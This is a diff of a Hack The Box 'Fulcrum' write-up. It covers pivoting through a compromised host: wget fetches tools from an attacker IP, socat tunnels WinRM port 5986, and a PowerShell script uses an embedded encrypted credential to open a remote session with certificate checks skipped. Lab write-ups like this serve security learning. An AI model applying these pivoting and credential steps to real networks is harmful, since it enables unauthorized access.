@@ -188,7 +188,7 @@ Address                  HWtype  HWaddress           Flags Mask            Iface
 10.10.10.2               ether   00:50:56:aa:9c:8d   C                     ens32
 ```
 
-Lets upload a nmap static binary (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and scan 192.168.122.228 for open ports 
+Lets upload a [nmap static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and scan 192.168.122.228 for open ports 
 
 ```
 wget http://10.10.14.99/nmap
@@ -210,7 +210,7 @@ I prefer using powershell from windows, instead of porting something to the linu
 
 So lets do some port forwading and get a powershell session! :smile:
 * Steps
-    * Download a Stand Alone socat binary from (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
+    * Download a [socat static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
     * Move it to the vm ``` upload socat ```
     * Port forward 5986 from upload.fulcrum.local ``` ./socat tcp-listen:5986,reuseaddr,fork tcp:192.168.122.228:5986```
     * Portforward te 5986 from the remote machine to the local kali machine ``` socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:5986 ```
@@ -220,23 +220,43 @@ So lets do some port forwading and get a powershell session! :smile:
 
 Create a script on the windows machine which would give us a PSSession
 ```
-------------------------------------------------
 $1 = 'WebUser'
 $2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
 $3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='
 $4 = $3 | ConvertTo-SecureString -key $2
 $5 = New-Object System.Management.Automation.PSCredential ($1, $4)
 $a = New-PSSessionOption -SkipCACheck -SkipCNCheck
-Enter-PSSession -Computer 192.168.1.41 -Credential $5 -UseSSL -SessionOption $a
-------------------------------------------------
+Enter-PSSession -Computer 192.168.1.41 -P 5986 -Credential $5 -UseSSL -SessionOption $a
 ```
 
+After running the ps1 on the windows machine we get a PSSession!!! GG
+```
+> .\fulcrum-connect.ps1
+[192.168.1.41]: PS C:\Users\WebUser\Documents> whoami
+webserver\webuser
+```
 
-=> ps -aux on linux machine to find the vmdk names
+Time to enumerate the f out of the machine xD
 
-10.25.25.1 => PfSense
-10.25.25.2 => DC (LDAP)
-10.25.25.3 => FILE Vm
+First we check what might be present on the network
+
+We can do a ps -aux on linux machine and we find a lot of qemu processes
+They have machine names
+We do nslookup of those machine names on the Powershell machine and we can identify what machine is present on what IP
+
+
+| IP            | Machine               |
+| ------------- |:-------------:        |
+| 10.25.25.2    | DC (dc.fulcrum.local) |
+| 10.25.25.3    | DC (dc.fulcrum.local) |
+
+
+Lets have a network map handy so we dont confuse stuff
+
+<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Network-Diagram.png"></kbd>
+
+
+
 
 =>Testing LDAP Creds to get Btables
 ------------------------------------------------
